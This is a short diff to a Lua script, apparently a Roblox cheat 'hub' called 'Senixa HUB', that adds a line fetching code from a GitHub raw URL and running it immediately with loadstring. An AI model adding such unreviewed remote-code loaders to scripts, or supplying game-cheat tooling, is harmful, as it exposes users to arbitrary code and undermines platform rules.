@@ -7,8 +7,7 @@ local WindUI = loadstring(game:HttpGet(
 
 local Players = game:GetService("Players")
 local LP = Players.LocalPlayer
-
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/boomrshgsh-source/MyWhitelist/refs/heads/main/Them"))()
 
 local Window = WindUI:CreateWindow({
     Title = "Senixa HUB [ Test ]",
